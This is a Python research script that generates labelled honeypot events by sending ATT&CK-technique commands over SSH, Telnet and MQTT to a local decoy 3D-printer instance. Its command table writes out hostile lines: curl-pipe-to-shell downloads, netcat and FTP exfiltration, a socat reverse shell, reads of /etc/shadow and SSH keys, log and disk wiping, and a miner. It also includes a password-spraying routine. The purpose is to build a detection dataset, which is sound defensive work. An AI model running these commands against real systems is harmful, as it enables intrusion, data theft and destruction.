"""Generate real, labelled HoneyPrint events for every observable ATT&CK Enterprise technique.

Run against one isolated custom-lab instance with SSH, Telnet and MQTT enabled
(see research/run_attack_scenarios.sh). Every connection goes to 127.0.0.1. The
decoy consoles never execute a host shell and URLs use the documentation range
198.51.100.0/24, so nothing is downloaded or sent anywhere. Each event's label is
the technique its scenario performs; the script also reports any event whose
transparent rule label disagrees, so mapping errors are visible.

    HONEYPRINT_RESEARCH_PASSWORD=... python research/generate_attack_scenarios.py \\
        --instance custom_attack --port 18181 --ssh-port 12223 --telnet-port 12323 \\
        --mqtt-port 11884 --database .honeyprint/attack-scenarios/events.sqlite3 \\
        --labels .honeyprint/attack-scenarios/labels.csv --user admin --run-id r1
"""

import argparse
from collections import Counter
import csv
import os
from pathlib import Path
import subprocess
import sys
import time

import paramiko

sys.path.insert(0, str(Path(__file__).resolve().parent))
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from generate_local_dataset import events_after, last_sequence, request, ssh_command, ssh_connect
from generate_mitre_gaps import Telnet, mqtt_subscribe
from dashboard.classification import rule_label
from dashboard.taxonomy import BENIGN

IP = '198.51.100.7'
CONSOLE = {
    'T1083': ['ls -la /home', 'find / -name "*.cfg"', 'pwd', 'ls ~/printer_data/gcodes'],
    'T1057': ['ps aux', 'top -b -n1', 'pgrep klipper'],
    'T1033': ['id', 'whoami', 'who', 'last'],
    'T1082': ['uname -a', 'hostname', 'uptime', 'cat /proc/cpuinfo', 'env'],
    'T1016': ['ifconfig', 'ip addr', 'route -n', 'ip route'],
    'T1016.001': [f'ping -c 1 {IP}', f'traceroute {IP}', 'ping -c 2 198.51.100.1'],
    'T1049': ['netstat -an', 'ss -tulpn', 'lsof -i'],
    'T1018': ['arp -a', 'arp -n', 'avahi-browse -a'],
    'T1046': ['nmap -sT 10.0.0.0/24', 'nc -zv 10.0.0.5 1-1024', 'masscan 10.0.0.0/24 -p80'],
    'T1007': ['systemctl list-units', 'service --status-all', 'systemctl list-unit-files'],
    'T1124': ['date', 'timedatectl'],
    'T1087.001': ['cat /etc/passwd', 'getent passwd'],
    'T1069.001': ['groups', 'cat /etc/group', 'getent group'],
    'T1518': ['dpkg -l', 'pip list', 'apt list --installed'],
    'T1201': ['chage -l pi', 'cat /etc/login.defs'],
    'T1614.001': ['locale', 'locale -a'],
    'T1120': ['lsusb', 'dmesg', 'lspci'],
    'T1652': ['lsmod', 'modinfo usbserial'],
    'T1497.001': ['systemd-detect-virt', 'dmidecode -s system-product-name', 'virt-what'],
    'T1003.008': ['cat /etc/shadow', 'cat /etc/gshadow'],
    'T1552.001': ['grep -ri password /etc', 'grep -r token ~/printer_data'],
    'T1552.003': ['cat ~/.bash_history', 'history', 'cat /root/.bash_history'],
    'T1552.004': ['cat ~/.ssh/id_rsa', 'cat /root/.ssh/id_ed25519'],
    'T1040': ['tcpdump -i eth0', 'tshark -i wlan0'],
    'T1059.004': ['bash', 'sh -c id', 'busybox', 'echo test', 'export X=1'],
    'T1059.006': ['python3 -c "print(1)"', 'python -V'],
    'T1053.003': ['crontab -l', 'crontab -e', 'at now + 1 minute'],
    'T1098.004': ['echo ssh-ed25519 AAAAC3 key >> ~/.ssh/authorized_keys', 'cat key.pub >> /root/.ssh/authorized_keys'],
    'T1136.001': ['useradd -m backdoor', 'adduser support2'],
    'T1543.002': ['systemctl enable updater', 'cp u.service /etc/systemd/system/'],
    'T1546.004': ['echo "nc -e /bin/sh x" >> ~/.bashrc', 'echo alias ls=x >> ~/.profile'],
    'T1548.001': ['chmod u+s /bin/bash', 'chmod 4755 /tmp/x'],
    'T1548.003': ['sudo -l', 'sudo -i', 'sudo id'],
    'T1078.003': ['su root', 'su - pi'],
    'T1070.003': ['history -c', 'rm ~/.bash_history'],
    'T1690': ['unset HISTFILE', 'export HISTSIZE=0'],
    'T1070.004': ['rm /tmp/x.sh', 'unlink /tmp/a', 'shred -u notes.txt'],
    'T1140': ['echo aGVsbG8= | base64 -d', 'xxd -r payload.hex'],
    'T1564.001': ['mkdir /tmp/.cache2', 'touch /home/pi/.hidden'],
    'T1222.002': ['chmod 777 /tmp/x', 'chown root:root /tmp/x', 'chmod +x run.sh'],
    'T1685.004': ['systemctl stop auditd', 'setenforce 0', 'auditctl -e 0'],
    'T1685.006': ['rm -rf /var/log/*', 'truncate -s0 /var/log/syslog', 'journalctl --vacuum-time=1s'],
    'T1686': ['iptables -F', 'ufw disable', 'nft flush ruleset'],
    'T1021.004': ['ssh pi@10.0.0.5', 'ssh root@192.168.1.20'],
    'T1005': ['cat config.yaml', 'head printer.cfg', 'strings firmware.bin'],
    'T1560.001': ['tar czf g.tgz gcodes', 'zip -r out.zip gcodes'],
    'T1074.001': ['cp part.gcode /tmp/', 'mv part.gcode /dev/shm/'],
    'T1105': [f'wget http://{IP}/x.sh', f'curl -O http://{IP}/m', f'tftp -g -r p {IP}', f'curl -s http://{IP}/i | sh'],
    'T1572': [f'ssh -R 9000:localhost:22 u@{IP}', f'socat TCP:{IP}:4444 EXEC:bash', 'ngrok tcp 22'],
    'T1048.003': [f'curl -T part.gcode ftp://{IP}/', f'nc {IP} 9000 < part.gcode'],
    'T1489': ['systemctl stop klipper', 'service moonraker stop', 'killall klippy'],
    'T1529': ['reboot', 'shutdown -h now', 'poweroff'],
    'T1485': ['rm -rf ~/printer_data/gcodes', 'rm -rf /home/pi/gcodes'],
    'T1561.001': ['dd if=/dev/zero of=/dev/mmcblk0', 'wipefs -a /dev/sda'],
    'T1486': ['openssl enc -aes-256-cbc -in a.gcode -out a.enc', 'gpg -c part.gcode'],
    'T1496.001': ['xmrig -o pool.example:3333', 'minerd -a sha256d'],
    'T1531': ['passwd pi', 'chpasswd', 'deluser pi'],
    'T1495': ['run M997', 'flashrom -w fw.bin', 'avrdude -U flash:w:fw.hex'],
    'T1491.001': ['run M117 HACKED', 'run M117 pay 1 BTC'],
    'T1592.003': ['run M115'],
    'T1565': ['run M502', 'run M500'],
}
BENIGN_CONSOLE = ['status', 'temperature', 'position', 'job', 'files', 'help', 'heat 200', 'bed 60', 'home']
MQTT_ABUSE = ['reboot', 'shutdown now', 'firmware flash', 'update firmware', 'delete all', 'format storage',
              'wipe sd', 'set admin', 'passwd root', 'execute shell', 'exec id', 'unsafe mode',
              'disable safety', 'debug on', 'frobnicate']
SPRAY_USERS = ['root', 'pi', 'ubuntu', 'octoprint', 'klipper', 'user', 'guest', 'test']


def ssh_fail(port, username):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect('127.0.0.1', port=port, username=username, password='wrong-' + username,
                       look_for_keys=False, allow_agent=False, timeout=5, auth_timeout=5, banner_timeout=5)
    except paramiko.AuthenticationException:
        pass
    finally:
        client.close()


def mqtt_publish(port, user, password, topic, message):
    subprocess.run(['mosquitto_pub', '-h', '127.0.0.1', '-p', str(port), '-u', user, '-P', password,
                    '-t', topic, '-m', message], capture_output=True, timeout=8, check=False)


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    for name in ('port', 'ssh-port', 'telnet-port', 'mqtt-port'):
        parser.add_argument('--' + name, type=int, required=True)
    parser.add_argument('--instance', required=True)
    parser.add_argument('--database', type=Path, required=True)
    parser.add_argument('--labels', type=Path, required=True)
    parser.add_argument('--user', default='admin')
    parser.add_argument('--run-id', required=True)
    parser.add_argument('--repeat', type=int, default=2)
    args = parser.parse_args()
    password = os.environ.get('HONEYPRINT_RESEARCH_PASSWORD')
    if not password or not args.database.is_file():
        parser.error('Set HONEYPRINT_RESEARCH_PASSWORD and start the isolated instance first')
    rows, disagree = [], Counter()
    run_start = last_sequence(args.database)

    def record(name, action, select, label_of):
        before = last_sequence(args.database)
        action()
        time.sleep(1.5)
        found = [(seq, e) for seq, e in events_after(args.database, before)
                 if e['instance_id'] == args.instance and select(e)]
        for seq, e in found:
            label = label_of(e)
            rows.append({'event_id': e['event_id'], 'sequence': seq, 'run_id': args.run_id,
                         'scenario': name, 'mitre_label': label})
            if e['event_type'].endswith('.command') and rule_label(e) != label:
                disagree[(label, rule_label(e), e['metadata'].get('command', ''), e['metadata'].get('intent', ''))] += 1
        print(f'{args.run_id} {name}: {len(found)} events', flush=True)

    console = lambda e: e['event_type'] in ('ssh.command', 'telnet.command')
    plan = [(command, label) for label, commands in CONSOLE.items() for command in commands]
    by_command = {}

    def run_console():
        with ssh_connect(args.ssh_port, args.user, password) as client:
            session = Telnet(args.telnet_port, password, args.user)
            try:
                for _ in range(args.repeat):
                    for command, label in plan:
                        ssh_command(client, command)
                        session.run(command)
                    for command in BENIGN_CONSOLE:
                        ssh_command(client, command)
                        session.run(command)
            finally:
                session.close()

    # Events arrive in order, so label them by matching the command sequence.
    expected = []
    for _ in range(args.repeat):
        for command, label in plan:
            expected += [label, label]
        for command in BENIGN_CONSOLE:
            expected += [BENIGN, BENIGN]

    def console_label(event):
        if str(event['metadata'].get('command', '')) == 'exit':
            return BENIGN
        return expected.pop(0) if expected else BENIGN

    record('console_techniques', run_console,
           lambda e: console(e) and e['metadata'].get('command') != 'exit', console_label)

    def run_mqtt():
        topic = f'honeyprint/{args.instance}/command'
        for _ in range(args.repeat * 2):
            for message in MQTT_ABUSE:
                mqtt_publish(args.mqtt_port, args.user, password, topic, message)
            for message in ('status', 'job', 'temperature'):
                mqtt_publish(args.mqtt_port, args.user, password, topic, message)

    record('mqtt_commands', run_mqtt, lambda e: e['event_type'] == 'mqtt.command', rule_label)

    def mqtt_enum():
        for _ in range(args.repeat * 2):
            for topic in ('#', '$SYS/#', '+/#', 'honeyprint/#', 'honeyprint/+/state'):
                mqtt_subscribe(args.mqtt_port, password, topic, args.user)
            mqtt_subscribe(args.mqtt_port, password, f'honeyprint/{args.instance}/#', args.user)

    record('mqtt_subscriptions', mqtt_enum, lambda e: e['event_type'] == 'mqtt.subscribe', rule_label)

    # Logins: spraying (many names), then a pause so the 60 s window resets, then guessing (one name).
    def spray():
        for _ in range(args.repeat):
            for name in SPRAY_USERS:
                ssh_fail(args.ssh_port, name)

    def guess():
        time.sleep(62)
        for _ in range(args.repeat * 4):
            ssh_fail(args.ssh_port, args.user)

    auth = lambda e: e['event_type'].endswith('.auth')
    record('password_spraying', spray, auth, lambda e: 'auth')
    record('password_guessing', guess, auth, lambda e: 'auth')

    def emergency_stop():
        time.sleep(62)  # new 60 s window, so earlier failures do not count
        for _ in range(args.repeat * 2):
            request(f'http://127.0.0.1:{args.port}', '/api/command', {'command': 'M112'})
        with ssh_connect(args.ssh_port, args.user, password) as client:
            for _ in range(args.repeat * 2):
                ssh_command(client, 'run M112')

    record('emergency_stop', emergency_stop,
           lambda e: e['event_type'] in ('printer.command', 'ssh.command')
           and str(e['metadata'].get('gcode', '')).upper() == 'M112', lambda e: 'T1529')
    if expected:
        print(f'WARNING: {len(expected)} console commands produced no event', flush=True)
    # Accepted logins in this run (all with the configured default account name).
    labelled = {row['event_id'] for row in rows}
    for seq, e in events_after(args.database, run_start):
        if (e['instance_id'] == args.instance and e['event_type'].endswith('.auth')
                and e['outcome'] == 'accepted' and e['event_id'] not in labelled):
            rows.append({'event_id': e['event_id'], 'sequence': seq, 'run_id': args.run_id,
                         'scenario': 'default_account_logins', 'mitre_label': 'auth'})

    args.labels.parent.mkdir(parents=True, exist_ok=True)
    exists = args.labels.is_file()
    with args.labels.open('a', newline='') as destination:
        writer = csv.DictWriter(destination, fieldnames=['event_id', 'sequence', 'run_id', 'scenario', 'mitre_label'])
        if not exists:
            writer.writeheader()
        writer.writerows(rows)
    print(f'{args.run_id}: {len(rows)} labelled events -> {args.labels}')
    for key, count in disagree.most_common():
        print('RULE DISAGREES', count, key)


if __name__ == '__main__':
    main()
